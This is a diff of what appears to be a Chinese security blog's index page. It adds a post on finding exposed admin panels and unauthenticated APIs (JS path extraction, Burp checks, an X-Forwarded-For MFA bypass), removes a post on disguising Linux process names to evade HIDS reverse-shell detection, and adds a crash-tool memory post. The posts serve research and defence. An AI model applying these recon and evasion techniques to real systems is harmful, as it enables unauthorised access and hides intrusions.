@@ -333,6 +333,147 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">安全建设-攻防思路及实践（一）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>以前挖国内src时的一个套路：</p>
+<p>通过”寻找管理后台 + 寻找api接口 + burp验证api接口”来找未授权api</p>
+<p>找到未授权api后，根据api功能就能造成不同危害：</p>
+<ul>
+<li>比如利用”重置密码接口”来重置管理员密码，然后登陆后台</li>
+<li>比如利用”查数据接口”获取数据</li>
+</ul>
+<p>个人觉得这个套路比较好用，原因在于：</p>
+<ul>
+<li>没有攻击payload，waf、nids等安全设备比较难检测（虽然可能按照访问404频率和比例等特征封禁）</li>
+<li>“管理后台对外开放”和”api接口未授权访问”，个人感觉这两个风险在企业里很难靠”技术手段”完全杜绝</li>
+<li>大部分检测工作可以用工具完成</li>
+</ul>
+<p>也有不好的地方，在于：</p>
+<ul>
+<li>整个流程没有完全自动化，需要人工做重复性的事情，比如判断是否是管理后台</li>
+</ul>
+<h1 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h1><ul>
+<li><p>怎么找”管理后台”？</p>
+<p>大概分三步：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 第一步筛出可能的管理后台地址</span><br><span class="line">* 第二步将首页截图保存成本地</span><br><span class="line">* 第三步人工浏览截图</span><br></pre></td></tr></table></figure>
+
+<p>第一步筛选管理后台地址的策略包括：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 域名中包含关键词，直接当作后台管理系统</span><br><span class="line">* 30x跳转地址包含关键词</span><br><span class="line">* 响应html中包含table标签（因为有可能后台管理首页就存在未授权访问，数据展示时会用到table标签）</span><br><span class="line">* 判断页面是否是vue框架写的（因为很多开发喜欢选择用vue来做管理系统）</span><br></pre></td></tr></table></figure>
+
+<p>脚本片段：<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/334b719e253261ffd0abfd161e499ae7">https://gist.github.com/leveryd/334b719e253261ffd0abfd161e499ae7</a></p>
+</li>
+<li><p>怎么找api接口？</p>
+<p>从js文件文本中找，策略如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 将js代码中字符串常量提取出来</span><br><span class="line">* 字符串常量匹配 &#96;&#x2F;[\w\d\-.&#x2F;]+&#96; 且不以 &#x2F;&#x2F; 字符开头，认为是api路径</span><br><span class="line">* 字符串常量匹配 &#96;[\w\d\-]+&#x2F;[\w\d\-.&#x2F;]+&#96; 且不以 &#x2F; 字符开头，认为是api路径</span><br></pre></td></tr></table></figure>
+
+<p>脚本片段：<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/465d19610d5fcf99199beb9284cd6f8c">https://gist.github.com/leveryd/465d19610d5fcf99199beb9284cd6f8c</a></p>
+<p>这种方式不需要前端存在sourcemap泄漏。</p>
+<p>当然如果前端有sourcemap信息就更好，这样可以利用 <a target="_blank" rel="noopener" href="https://github.com/SunHuawei/SourceDetector">利用sourcemap还原前端项目-浏览器插件</a> 这种工具还原前端项目，代码阅读性更好一些。接着对前端项目做代码审计，有可能在前端代码中看到 啥token、啥功能比较特殊的api接口（比如上传文件）。</p>
+</li>
+<li><p>怎么使用burpsuite验证api接口？</p>
+<p>将找到的api接口放到burpsuite批量验证，根据 响应状态码、响应长度、响应内容 来判断是否有未授权的api接口。</p>
+<p>测试过程中可以变换请求方法：GET、POST、PUT</p>
+<p>确认存在未授权接口后，再人工从前端js中找参数值利用。</p>
+</li>
+</ul>
+<h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><ul>
+<li>[评级高危-顺丰某系统后台API接口未做认证导致用户信息泄漏]</li>
+<li>[评级高危-顺丰某系统未授权导致获取后台管理权限，可查看大量订单信息]</li>
+<li>[评级高危-字节某业务线后端接口未授权访问]</li>
+<li>[评级中危-腾讯广告后台接口未认证]</li>
+<li>[评级低危-后台API接口存在未授权访问(可增删改数据)]</li>
+</ul>
+<h1 id="安全管理与技术"><a href="#安全管理与技术" class="headerlink" title="安全管理与技术"></a>安全管理与技术</h1><p>对于”管理后台对外开放”和”api接口未授权访问”这两类风险，在企业安全建设中是怎么防范的呢？</p>
+<ul>
+<li><p>怎么减少”管理后台对外”安全风险？</p>
+<p>根据个人有限的经验来总结，管理上包括如下手段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 公司发布安全红线：禁止后台开放到公网访问</span><br><span class="line">* 安全意识的宣导</span><br></pre></td></tr></table></figure>
+
+<p>技术上包括如下手段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 统一认证登陆</span><br><span class="line">* 周期性对资产做扫描，识别&quot;管理后台&quot;</span><br><span class="line">* 从流量层面识别&quot;管理后台&quot;</span><br></pre></td></tr></table></figure>
+
+<p>业务上包括如下手段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 后台访问白名单限制</span><br><span class="line">* 后台登陆多因素认证MFA（短信二次认证、rsa token等）</span><br></pre></td></tr></table></figure>
+
+<p>比如能看到的，滴滴很多后台管理业务都接入了统一认证登陆，对于我来说就比较难进一步测试。</p>
+<p>不过上面的手段都并不一定管用，各种手段自身也有设计缺陷、安全漏洞等。</p>
+<p>比如我前公司的统一认证平台 <a target="_blank" rel="noopener" href="https://passport.fangdd.com/public/login?url=https://passport.fangdd.com/password/resetingPage.do;jsessionid=88F109354741F07D5ED2004B1BB5E35C-n1">统一认证登陆</a> 出现过一个设计上的漏洞。</p>
+<p>正常的业务场景是：它支持钉钉登陆，员工在web页面输入邮箱后，钉钉app会收到一个确认登陆链接。员工点击确认链接后，web端就会验证通过，进入到后台系统。</p>
+<p>有白帽子收集一些部分员工邮箱，就在web页面填收集到的邮箱。结果有部分员工点击了钉钉上收到的”确认登陆链接”消息，帮助”攻击者”进到了后台系统。</p>
+<p>另外还听我同事给我分享的案例，他遇到某些有多因子认证的系统时，加x-forwarded-for请求头伪造内网ip就绕过去了，原因是面向内部的系统去掉了”多因子认证”。</p>
+<p>至于安全意识的宣导、安全红线到底有多大作用，这感觉更不好衡量。</p>
+</li>
+<li><p>怎么减少”api接口未授权访问”安全风险？</p>
+<p>根据个人有限的经验来总结，技术上包括以下手段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 依赖开发人员的代码安全质量</span><br><span class="line">* 零信任架构的实施</span><br></pre></td></tr></table></figure>
+
+<p>零信任应用的两个场景包括了 用户访问服务 和 服务之间互相访问 时的认证鉴权，而”用户登陆后台访问数据”恰好就是”用户访问服务”这个场景。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>验证了这个老套路在国内还是能挖到洞的。</p>
+<p>站在攻击方的角度来看，现有每一步的安全策略可以优化，比如可以详细调研一下后台系统的分类，比如为什么开源的cms后台和前台经常是在一个域名下，而企业里的后台系统为什么经常是单独的访问方式？</p>
+<p>整个流程或许也可以优化到完全依赖工具产出报警，就像 <a target="_blank" rel="noopener" href="https://www.hackinn.com/index.php/archives/744/">一种针对Webpack等前端打包工具构建的网站的自动化测试思路（附开源项目）</a> 一样。虽然没有用过这个项目，但是看文章介绍感觉有不少实战上的细节和经验。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -441,7 +582,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -454,7 +595,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/" class="post-title-link" itemprop="url">如何改变进程名称</a>
+          <a href="/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/" class="post-title-link" itemprop="url">借助crash工具理解linux系统的内存分配</a>
         </h2>
 
         <div class="post-meta-container">
@@ -478,92 +619,42 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pFpGujKnXMhOh5ef3Z9H2g">测试反弹shell</a>时，测试发现：某厂商会根判断程命令是否是bash、sh等脚本解释器，如果修改bash、sh等文件名后反弹shell，就会绕过厂商的反弹shell防护。</p>
-<blockquote>
-<p>需要注意的的是：”修改敏感文件名、复制敏感文件“本身非常有可能被hids当作一种”异常文件操作”行为。</p>
-</blockquote>
-<p>还有一些场景下也会涉及到”进程名称的修改”：比如某些恶意软件会修改进程名称，伪装成”内核线程”。</p>
-<p>所以可以说，在”进程名称的修改”这个点上是存在一些攻防对抗的。</p>
-<p>本文研究：</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxbp6PGpCqzFDSToIWn05Q">Linux下访问匿名页发生的神奇“化学反应”</a>，我看完这篇文章感觉对linux的内存分配又多了一点点理解，因此也想推荐给你读下。</p>
+<p>原文提出了一个问题：向<code>mmap</code>系统调用申请的内存”读时”没有导致物理可用内存减少，但是”随后写时”发现物理可用内存减少。</p>
+<p>原作者借助”分析内核源码”的收到来剖析问题原因，最终得到结论：第一次读匿名页后，然后写匿名页，先只读方式映射到0页，然后发生写时复制，分配物理页，虚拟页以可读可写的方式映射到此物理页。</p>
+<p>我自己总结一下，就是按照时间顺序来看，当对”可读可写的vma”先读后写时，”对应的页表项”应该是：</p>
 <ul>
-<li>除了直接修改程序文件名，还有哪些方式来修改进程名称？</li>
-<li>作为防守方，怎么发现和检测这些”修改方式”？</li>
+<li>在第一次读之前不存在</li>
+<li>在第一次读之后，第一次写之前，映射到固定位置，此时页表属性是只读</li>
+<li>在第一次写之后，映射到实际分配的物理内存，此时页表属性是可读可写</li>
 </ul>
-<p>本文应该适合 做应急响应、hids和”对linux后渗透感兴趣”的读者阅读，文章中给出了我对每种隐藏方式的效果验证，方便读者对隐藏效果做评估。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>怎么查看”进程名称”？</p>
-<p>在 /proc/{pid} 目录下有好几个文件都存放有”进程名称”相关的信息，如下图：<br><img src="https://user-images.githubusercontent.com/1846319/131244474-9dbb39c7-ba13-4033-a213-809a7773e443.png" alt="image"></p>
-<p>更常见的情况下，我们是通过ps、top等命令来查看进程信息。</p>
-<p>ps命令也是基于 /proc/{pid}/stat、/proc/{pid}/status、/proc/{pid}/cmdline 等文件来获取进程信息。可以通过strace命令查看系统调用验证一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# strace ps aux 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;cmdline&quot;, O_RDONLY)   &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br><span class="line">[root@instance-fj5pftdp ~]#</span><br><span class="line">[root@instance-fj5pftdp ~]# strace ps -A 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么修改”进程名称”？</p>
-<p>改变进程名包括以下方式：</p>
-<ul>
-<li>execve系统调用</li>
-<li>prctl系统调用</li>
-<li>修改进程argv</li>
-<li>软链接</li>
-</ul>
-</li>
-</ul>
-<h1 id="通过”execve系统调用”改变进程名称"><a href="#通过”execve系统调用”改变进程名称" class="headerlink" title="通过”execve系统调用”改变进程名称"></a>通过”execve系统调用”改变进程名称</h1><ul>
-<li><p>怎么通过”execve系统调用”可以改变进程名称？</p>
-<p>execve系统调用的第二个参数可以指定cmdline，如下：</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/131255950-11235b12-c64c-4572-8a0d-521a299b3ee6.png" alt="image"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">     char * execve_str[] &#x3D; &#123;&quot;test_sleep&quot;,&quot;10000&quot;&#125;;   &#x2F;&#x2F; 第一个参数会出现在&#x2F;pro&#x2F;&#123;pid&#125;&#x2F;cmdline</span><br><span class="line">     char * env[] &#x3D; &#123;NULL&#125;;</span><br><span class="line">     if (execve(&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;,execve_str,env) &lt;0 )&#123;</span><br><span class="line">         perror(&quot;error on exec&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可能这个结论你听着还是有点绕，并且我想你可能和我一样，也不想一下子就去研究”内核源码”来理解到底是怎么回事。</p>
+<p>那怎么能搞清楚原文的问题和结论呢？我发现一个神器<code>crash</code>，实际操作一番后，我感觉文章结论其实很好理解。下面就和我一起玩一玩<code>crash</code>，理解<code>mmap</code>分配的内存到底是怎么回事，也验证一下原文的结论是否正确。</p>
+<p>crash是一个可以用来调试linux内核崩溃的工具，也可以调试正在运行中的内核。它的安装和使用都很简单，理解本篇文章也不需要你之前接触过这个工具。</p>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ul>
+<li><p>准备源码</p>
+<p>我们在”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻分别调用<code>getchar()</code>停顿一下，方便我们用<code>crash</code>工具观察”页表项”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp tmp]# cat e.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  char* addr &#x3D; mmap (NULL, 1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS , - 1 , 0);</span><br><span class="line"></span><br><span class="line">  printf (&quot;addr: %lu pid:%d\n&quot;, addr, getpid()); &#x2F;&#x2F; 在读内存之前：页表项不存在</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  printf (&quot;1:%s \n&quot;, addr);	&#x2F;&#x2F; 在读内存之后：映射了页表,页表项属性为&quot;只读&quot;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  strcpy(addr, &quot;AAAABBBB&quot;);	&#x2F;&#x2F; 在写内存之后：页表项属性为&quot;可读可写&quot;</span><br><span class="line"></span><br><span class="line">  printf (&quot;2:%s \n&quot;, addr);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>更简便的方式是：通过bash的exec命令的<code>-a</code>参数改变进程名称</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec -a &quot;xxx&quot; sleep 10000</span><br></pre></td></tr></table></figure>
+<p>上面的c程序编译运行后，我们就可以来分析”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻的”页表项”是什么了。</p>
 </li>
-<li><p>效果</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/131254028-441d0792-68b5-4eab-b2a2-6208fe6f2c70.png" alt="image"></p>
-<p>可以看到：<code>ps -A</code>可以看到sleep文件名信息，<code>ps aux</code>无法看到。</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/131253952-c2ea6b18-614f-4145-b7a5-c05b97235a29.png" alt="image"></p>
-<p>可以看到：只有cmdline被修改了。</p>
-</li>
-</ul>
-<h1 id="通过”prctl系统调用”改变进程名称"><a href="#通过”prctl系统调用”改变进程名称" class="headerlink" title="通过”prctl系统调用”改变进程名称"></a>通过”prctl系统调用”改变进程名称</h1><ul>
-<li><p>怎么通过”prctl系统调用”改变进程名称？</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
-</li>
-<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256636-e9edd238-3856-4f90-a126-30570e44a472.png" alt="image"></p>
-<p>可以看到虽然stat、comm、status文件已经修改，但是cmdline、exe等文件仍然有原程序名信息。</p>
-</li>
-<li><p>怎么检测？</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/driver/README-zh_CN.md">字节hids</a> hook了这个系统调用</p>
+<li><p>使用<code>crash</code>分析”页表项”的变化</p>
+<p>首先简单说一下crash的安装和使用。</p>
+<p>如果你是centos系统，就可以用以下命令来安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install crash  &#x2F;&#x2F; 安装crash工具</span><br><span class="line">debuginfo-install kernel-debuginfo-&#96;uname -r&#96;  &#x2F;&#x2F; 安装crash工具需要的内核文件</span><br></pre></td></tr></table></figure>
+
+<p>安装好后，使用下面的命令就可以调试”运行中的内核了”。vmlinux是带调试符号的内核文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# crash &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;usr&#x2F;lib&#x2F;modules&#x2F;3.10.0-1160.11.1.el7.x86_64&#x2F;vmlinux &#x2F;dev&#x2F;mem</span><br></pre></td></tr></table></figure>
+
+<p>下面来看一下”页表项”的变化：我在程序三次<code>getchar()</code>时，使用<code>crash</code>的<code>vtop</code>命令查看”虚拟地址”对应的页表</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/146151529-65a92898-2a18-48a5-958f-5076d5d94442.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">crash&gt; set 31880    &#x2F;&#x2F; 31880是进程号</span><br><span class="line">    PID: 31880</span><br><span class="line">COMMAND: &quot;a.out&quot;</span><br><span class="line">   TASK: ffff9396f6a7a100  [THREAD_INFO: ffff93983cbe4000]</span><br><span class="line">    CPU: 1</span><br><span class="line">  STATE: TASK_INTERRUPTIBLE</span><br><span class="line">crash&gt; px 139812061335552  &#x2F;&#x2F; 十进制转成十六进制。139812061335552是mmap的返回值</span><br><span class="line">$1 &#x3D; 0x7f2888405000</span><br><span class="line">crash&gt; vtop 0x7f2888405000  &#x2F;&#x2F; vtop指令用来查看&quot;虚拟地址&quot;对应的&quot;物理地址&quot;</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  (not mapped)  &#x2F;&#x2F; 这里可以看出来，此时没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">   PGD: 16abd67f0 &#x3D;&gt; 16b7d7067</span><br><span class="line">   PUD: 16b7d7510 &#x3D;&gt; 170f95067</span><br><span class="line">   PMD: 170f95210 &#x3D;&gt; 160fd5067</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 0      &#x2F;&#x2F; &quot;页表项&quot;为0，其中的P标志位为0，表示&quot;页表项&quot;不存在，没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  117d65000</span><br><span class="line">....</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 8000000117d65225</span><br><span class="line">  PAGE: 117d65000</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">8000000117d65225  117d65000  (PRESENT|USER|ACCESSED|NX)   &#x2F;&#x2F; 此时&quot;页表项&quot;有了映射关系，说明此时只能读不能写</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">80000003b0cf5867  3b0cf5000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)    &#x2F;&#x2F; RW标志表明此时可以写</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>如上面指令结果中的注释：执行三次vtop指令时，页表项(PTE)中的”FLAGS”都不断变化，读写权限确实像”问题背景”中那样变化。可以看出来，结论是没有问题的</p>
+<p>怎么样，crash验证这个结论是不是很简单？</p>
 </li>
 </ul>
-<h1 id="通过”修改进程argv-0-”隐藏进程名称"><a href="#通过”修改进程argv-0-”隐藏进程名称" class="headerlink" title="通过”修改进程argv[0]”隐藏进程名称"></a>通过”修改进程argv[0]”隐藏进程名称</h1><ul>
-<li><p>怎么通过”修改进程argv[0]”隐藏进程名称？</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
-</li>
-<li><p>谁用了这种方式？</p>
-<p>恶意软件<a target="_blank" rel="noopener" href="https://github.com/n1nj4sec/pupy/blob/unstable/pupy/packages/linux/all/hide_process.py">puppy</a> 就用到了这种方式修改进程名为”[kworker/2:0]”。</p>
-<blockquote>
-<p>“[XXXX]”这种进程名都是内核线程</p>
-</blockquote>
-<p><img src="https://user-images.githubusercontent.com/1846319/131245230-c8f97321-5d04-41f9-a347-f7a4f69e3794.png" alt="image"></p>
-</li>
-<li><p>效果</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/131253587-ec40a6c2-2b19-4df1-90d3-68a6772be975.png" alt="image"></p>
-<p>可以看到：只有cmdline被修改了。</p>
-</li>
-</ul>
-<h1 id="通过”软链接”改变进程名称"><a href="#通过”软链接”改变进程名称" class="headerlink" title="通过”软链接”改变进程名称"></a>通过”软链接”改变进程名称</h1><ul>
-<li><p>是什么？</p>
-<p>在 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1609832">两个主题：躲避execve与分析/proc/目录</a> 这篇文章提到了：利用”软链接”可以改变进程信息，并且文件哈希和源文件不一致，这样可以用来躲避安全产品的监控。</p>
-</li>
-<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256254-29bd80e0-8475-47f2-a13f-c6d4bfcc3b39.png" alt="image"></p>
-<p>可以看到：只有exe文件还有原程序信息，所以这种方式隐藏进程名的效果是最好的。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可以有以下结论：</p>
-<ul>
-<li>单看四种隐藏方式，”软链接”这种方式隐蔽得最好；其他几种方式，comm、stat、cmdline、status文件中总会有原程序相关信息</li>
-<li>不论哪种方式，exe文件仍然有原程序相关信息</li>
-<li>像”prctl系统调用”这种方式应该避免使用</li>
-</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>crash很好用，如果你想了解更多crash工具的应用场景，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw">解决Linux内核问题实用技巧之 - Crash工具结合/dev/mem任意修改内存</a></p>
 
       
     </div>
@@ -723,6 +814,126 @@
   
 
